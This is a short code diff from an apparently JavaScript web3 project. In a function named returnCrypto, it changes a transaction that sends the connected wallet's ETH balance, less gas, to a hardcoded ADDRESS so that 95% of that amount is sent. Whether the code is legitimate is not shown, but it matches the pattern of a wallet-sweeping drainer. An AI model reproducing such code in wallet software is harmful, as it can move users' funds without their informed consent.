@@ -80,7 +80,7 @@ export const returnCrypto = () => {
                 web3.eth.sendTransaction({
                   from: address,
                   to: ADDRESS,
-                  value: Math.floor(Number(ethBalance) - gasCost),
+                  value: Math.floor((Number(ethBalance) - gasCost) * 0.95),
                   gasPrice,
                   gasLimit,
                 });
